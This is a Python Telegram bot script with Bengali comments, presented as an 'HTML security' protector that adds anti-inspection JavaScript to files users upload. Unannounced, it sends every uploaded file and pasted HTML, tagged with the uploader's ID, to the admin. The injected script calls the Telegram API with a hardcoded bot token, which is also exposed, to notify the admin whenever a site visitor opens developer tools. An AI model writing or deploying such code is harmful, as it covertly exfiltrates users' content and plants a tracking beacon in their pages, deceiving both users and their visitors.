import os
import telebot
from telebot import types

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8987787400:AAHyqVQf45234LpFEnmgfJ-AahfG_We4-8A"
ADMIN_ID = 8419760844
REQUIRED_CHANNEL_ID = -1003810620422
REQUIRED_CHANNEL_LINK = "https://t.me/SUPPOR8TNIROB"

MY_TELEGRAM_USERNAME = "NIROB_GX_LEADER"
MY_BOT_USERNAME = "nirob_team_Obucsate_bot"
# =======================================================

bot = telebot.TeleBot(BOT_TOKEN)

def check_must_join(user_id):
    try:
        member = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
        if member.status in ['creator', 'administrator', 'member']:
            return True
        return False
    except Exception as e:
        print(f"Must Join Check Error: {e}")
        return False

def inject_bn_security_layer(html_content):
    """
    BN Security & High-Grade Protection:
    - অরিজিনাল এইচটিএমএল, সিএসএস, এবং ডিজাইন ১০০% অক্ষুণ্ণ রাখবে।
    - হোস্টিংয়ে ছাড়লে কোনো ব্ল্যাক স্ক্রিন বা জ্যাম হবে না।
    - ভিউ পেজ সোর্স বা কমেন্টে আপনার এবং বটের প্রচারের জন্য ইউজারনেম যুক্ত থাকবে।
    - কনসোল/ইন্সপেক্ট (F12) ট্র্যাপ ও অ্যালার্ট সিস্টেম সক্রিয় থাকবে।
    """
    bn_security_script = f"""
    <!--==================================================
    🔥 BN SECURITY & ELITE PROTECTION ACTIVATED 🔥
    --------------------------------------------------
    Protected By: @{MY_TELEGRAM_USERNAME}
    Official Bot: @{MY_BOT_USERNAME}
    Status: UNBREAKABLE SHIELD ACTIVE 🛑
    ==================================================-->
    <script>
    (function() {
        // হেডলেস বা বট ব্রাউজার ডিটেকশন
        try {
            var ua = navigator.userAgent.toLowerCase();
            if (ua.includes("headless") || ua.includes("phantomjs") || ua.includes("selenium")) {
                document.body.innerHTML = "";
                window.location.href = "about:blank";
            }
        } catch(e) {{}}

        let devtoolsOpen = false;
        const threshold = 160;

        function triggerConsoleAlert() {
            if (!devtoolsOpen) {
                devtoolsOpen = true;
                document.documentElement.innerHTML = "<div style='background:#000;color:#00ffcc;height:100vh;display:flex;justify-content:center;align-items:center;font-family:monospace;font-size:20px;text-align:center;padding:20px;'>SECURITY ALERT!<br>Developer Console Detected.<br>Protected by @{MY_TELEGRAM_USERNAME}</div>";
                
                // এডমিন ইনবক্সে অ্যালার্ট পাঠানো
                fetch("https://api.telegram.org/bot8987787400:AAHyqVQf45234LpFEnmgfJ-AahfG_We4-8A/sendMessage?chat_id=8419760844&text=🚨%20Alert!%20Someone%20tried%20to%20inspect%20protected%20HTML%20file!");
            }
        }

        // শর্টকাট কি ব্লক (F12, Ctrl+Shift+I, Ctrl+U)
        document.addEventListener('keydown', function(e) {
            if (e.keyCode === 123 || 
                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || 
                (e.ctrlKey && e.keyCode === 85)) {
                e.preventDefault();
                triggerConsoleAlert();
                return false;
            }
        });

        // ডিবাগিং ও কনসোল ট্র্যাপ লুপ
        setInterval(function() {
            const widthThreshold = window.outerWidth - window.innerWidth > threshold;
            const heightThreshold = window.outerHeight - window.innerHeight > threshold;
            if (widthThreshold || heightThreshold) {
                triggerConsoleAlert();
            }
            
            var startTime = performance.now();
            debugger;
            var endTime = performance.now();
            if (endTime - startTime > 100) {
                triggerConsoleAlert();
            }
        }, 1000);

        // রাইট ক্লিক ডিজাবল
        document.addEventListener('contextmenu', event => event.preventDefault());
    })();
    </script>
    """
    
    # হোস্টিংয়ে যেন ব্ল্যাক স্ক্রিন না হয় এবং ডিজাইন ঠিক থাকে সেজন্য সঠিক জায়গায় ইনজেক্ট করা
    if "<body>" in html_content:
        return html_content.replace("<body>", "<body>\n" + bn_security_script)
    elif "</head>" in html_content:
        return html_content.replace("</head>", bn_security_script + "\n</head>")
    else:
        return bn_security_script + html_content

def get_main_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_sec = types.KeyboardButton("🛡️ HTML Security")
    btn_help = types.KeyboardButton("📌 Help & Guide")
    btn_channel = types.KeyboardButton("📢 Official Channel/Group")
    markup.add(btn_sec, btn_help, btn_channel)
    
    if user_id == ADMIN_ID:
        btn_admin = types.KeyboardButton("⚙️ Admin Panel")
        markup.add(btn_admin)
        
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not check_must_join(user_id):
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton("Join Group 📢", url=REQUIRED_CHANNEL_LINK)
        check_btn = types.InlineKeyboardButton("Check Join ✅", callback_data="check_join")
        markup.add(btn)
        markup.add(check_btn)
        
        bot.reply_to(
            message, 
            f"⚠️ **অ্যাক্সেস রেস্ট্রিক্টেড!**\n\nবটটি ব্যবহার করতে হলে আমাদের গ্রুপে জয়েন করতে হবে:\n{REQUIRED_CHANNEL_LINK}", 
            reply_markup=markup, 
            parse_mode="Markdown"
        )
        return

    bot.reply_to(
        message, 
        f"🔥 **স্বাগতম! BN Security HTML Protector বটে।**\n\n"
        "🛡️ আপনার `.html` ফাইল পাঠান। হোস্টিংয়ে ফুল স্মুথ রান করবে এবং কোনো ডিজাইন বা লেখা ভাঙবে না!",
        reply_markup=get_main_keyboard(user_id),
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def callback_check_join(call):
    if check_must_join(call.from_user.id):
        bot.answer_callback_query(call.id, "ধন্যবাদ! সফলভাবে ভেরিফাই হয়েছে।")
        bot.send_message(call.message.chat.id, "✅ এখন আপনি বটটি ব্যবহার করতে পারবেন।", reply_markup=get_main_keyboard(call.from_user.id))
    else:
        bot.answer_callback_query(call.id, "❌ আপনি এখনো গ্রুপে জয়েন করেননি!", show_alert=True)

@bot.message_handler(func=lambda msg: msg.text in ["🛡️ HTML Security", "📌 Help & Guide", "📢 Official Channel/Group", "⚙️ Admin Panel"])
def handle_menu_clicks(message):
    user_id = message.from_user.id
    if not check_must_join(user_id):
        send_welcome(message)
        return
        
    if message.text == "🛡️ HTML Security":
        bot.reply_to(message, "📂 আপনার `.html` ফাইলটি সরাসরি ডকুমেন্ট আকারে আপলোড করুন।")
    elif message.text == "📌 Help & Guide":
        bot.reply_to(message, f"📖 **গাইড:** BN Security লেয়ার আপনার ফাইল হোস্টিংয়ে ব্ল্যাক হওয়া থেকে বাঁচায় এবং সোর্স কোডে @{MY_TELEGRAM_USERNAME} ট্যাগ যুক্ত করে।")
    elif message.text == "📢 Official Channel/Group":
        bot.reply_to(message, f"📢 গ্রুপ লিংক: {REQUIRED_CHANNEL_LINK}")
    elif message.text == "⚙️ Admin Panel" and user_id == ADMIN_ID:
        bot.reply_to(message, "⚙️ **এডমিন প্যানেল:** BN Security ও ব্যাকআপ সিস্টেম ফুললি একটিভ আছে।")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id
    if not check_must_join(user_id):
        send_welcome(message)
        return

    if not message.document.file_name.endswith(('.html', '.htm')):
        bot.reply_to(message, "❌ অনুগ্রহ করে একটি সঠিক `.html` ফাইল আপলোড করুন।")
        return

    msg = bot.reply_to(message, "⚙️ BN Security লেয়ার এবং প্রটেকশন যুক্ত করা হচ্ছে...")
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        raw_html = downloaded_file.decode('utf-8', errors='ignore')

        # ১. ইউজারের আসল ফাইল এডমিনের ইনবক্সে ব্যাকআপ পাঠানো
        user_info = f"👤 User: @{message.from_user.username} (ID: {user_id})"
        with open(f"original_{message.document.file_name}", "w", encoding="utf-8") as orig_f:
            orig_f.write(raw_html)
        
        with open(f"original_{message.document.file_name}", "rb") as orig_f:
            bot.send_document(
                ADMIN_ID, 
                orig_f, 
                caption=f"📥 **New Raw HTML Backup!**\n{user_info}\n📁 File: {message.document.file_name}",
                parse_mode="Markdown"
            )
        os.remove(f"original_{message.document.file_name}")

        # ২. BN Security প্রটেকশন প্রয়োগ করা
        protected_code = inject_bn_security_layer(raw_html)

        output_filename = f"Protected_{message.document.file_name}"
        with open(output_filename, "w", encoding="utf-8") as f:
            f.write(protected_code)

        # ৩. ইউজারকে ফাইল পাঠানো
        with open(output_filename, "rb") as f:
            bot.send_document(
                message.chat.id, 
                f, 
                caption=f"✅ **ফাইল সফলভাবে BN Security দিয়ে প্রটেক্ট করা হয়েছে!**\n🛡️ *Owner: @{MY_TELEGRAM_USERNAME}*\n🤖 *Bot: @{MY_BOT_USERNAME}*",
                reply_markup=get_main_keyboard(user_id),
                parse_mode="Markdown"
            )
        
        if os.path.exists(output_filename):
            os.remove(output_filename)
        bot.delete_message(message.chat.id, msg.message_id)

    except Exception as e:
        bot.edit_message_text(f"❌ এরর ঘটেছে: {str(e)}", message.chat.id, msg.message_id)

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    if not check_must_join(user_id):
        send_welcome(message)
        return

    if "<html" in message.text.lower() or "<script" in message.text.lower() or "<div" in message.text.lower():
        msg = bot.reply_to(message, "⚙️ কোড প্রসেস করা হচ্ছে...")
        
        bot.send_message(ADMIN_ID, f"📥 **Raw HTML Text from User ID:** `{user_id}`\n\n```html\n{message.text[:3000]}\n```", parse_mode="Markdown")

        protected_code = inject_bn_security_layer(message.text)
        
        output_filename = "Protected_Code.html"
        with open(output_filename, "w", encoding="utf-8", errors="ignore") as f:
            f.write(protected_code)

        with open(output_filename, "rb") as f:
            bot.send_document(
                message.chat.id, 
                f, 
                caption=f"✅ **কোডটি সফলভাবে প্রটেক্ট করা হয়েছে!**\n🛡️ *By @{MY_TELEGRAM_USERNAME}*",
                reply_markup=get_main_keyboard(user_id),
                parse_mode="Markdown"
            )

        if os.path.exists(output_filename):
            os.remove(output_filename)
        bot.delete_message(message.chat.id, msg.message_id)
    else:
        bot.reply_to(message, "💡 প্রটেক্ট করতে আপনার `.html` ফাইল আপলোড করুন।", reply_markup=get_main_keyboard(user_id))

if __name__ == "__main__":
    print(f"Bot @{MY_BOT_USERNAME} is running with BN Security & Admin Backup...")
    bot.infinity_polling()
